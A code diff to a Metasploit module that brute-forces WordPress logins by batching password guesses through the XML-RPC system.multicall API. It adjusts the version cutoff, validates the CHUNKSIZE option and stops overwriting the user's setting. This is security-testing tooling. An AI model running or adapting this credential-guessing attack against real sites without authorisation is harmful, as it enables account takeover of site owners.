@@ -19,8 +19,9 @@ class MetasploitModule < Msf::Auxiliary
         'Name' => 'Wordpress XML-RPC system.multicall Credential Collector',
         'Description' => %q{
           This module attempts to find Wordpress credentials by abusing the XMLRPC
-          APIs. Wordpress versions prior to 4.4.1 are suitable for this type of
-          technique. For newer versions, the script will drop the CHUNKSIZE to 1 automatically.
+          APIs. Wordpress versions prior to 4.4 are suitable for this type of
+          technique. From version 4.4 onward, the module uses one password per
+          request to handle request-scoped authentication failure prevention.
         },
         'Author' => [
           'KingSabri <King.Sabri[at]gmail.com>',
@@ -63,8 +64,8 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def check_options
-    if datastore['CHUNKSIZE'] > 1700
-      fail_with(Failure::BadConfig, 'Option CHUNKSIZE cannot be larger than 1700')
+    unless (1..1700).cover?(datastore['CHUNKSIZE'])
+      fail_with(Failure::BadConfig, 'Option CHUNKSIZE must be between 1 and 1700')
     end
   end
 
@@ -73,6 +74,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def check_setup
+    @effective_chunk_size = datastore['CHUNKSIZE']
     version = wordpress_version
     vprint_good("Found Wordpress version: #{version}")
 
@@ -82,10 +84,12 @@ class MetasploitModule < Msf::Auxiliary
     elsif !wordpress_xmlrpc_enabled?
       print_error("#{peer}:#{rport}#{wordpress_url_xmlrpc} does not enable XMLRPC")
       false
-    elsif Rex::Version.new(version) >= Rex::Version.new('4.4.1')
+    elsif Rex::Version.new(version) >= Rex::Version.new('4.4')
+      # The auth_failed latch blocks subsequent credentials in the same request.
+      # https://github.com/WordPress/WordPress/blob/4.4/wp-includes/class-wp-xmlrpc-server.php
       print_error("#{peer}#{wordpress_url_xmlrpc} Target's version (#{version}) is not vulnerable to this attack.")
-      vprint_status("Dropping CHUNKSIZE from #{datastore['CHUNKSIZE']} to 1")
-      datastore['CHUNKSIZE'] = 1
+      vprint_status("Using a chunk size of 1 instead of configured CHUNKSIZE #{datastore['CHUNKSIZE']}")
+      @effective_chunk_size = 1
       true
     else
       print_status("Target #{peer} is running Wordpress")
@@ -112,7 +116,7 @@ class MetasploitModule < Msf::Auxiliary
     scanner = Metasploit::Framework::LoginScanner::WordpressMulticall.new(
       configure_http_login_scanner(
         passwords: passwords,
-        chunk_size: datastore['CHUNKSIZE'],
+        chunk_size: @effective_chunk_size,
         block_wait: datastore['BLOCKEDWAIT'],
         base_uri: target_uri.path,
         uri: wordpress_url_xmlrpc,
